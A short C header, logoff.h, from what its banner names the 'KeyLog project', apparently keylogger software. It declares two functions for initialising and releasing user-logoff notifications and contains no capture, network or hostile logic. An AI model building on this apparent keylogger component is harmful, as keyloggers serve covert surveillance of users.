//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// KeyLog project. Version 3.0
//	
// module: logoff.h
// $Revision: 58 $
// $Date: 2014-12-17 17:44:58 +0300 (Ср, 17 дек 2014) $
// description:
//	User session end notification

#ifndef __LOGOFF_H_
#define __LOGOFF_H_

// initializes logoff notifications
VOID LogoffNInitialize( VOID );

// stops and releases logoff notifications
VOID LogoffNRelease(VOID);

#endif //__LOGOFF_H_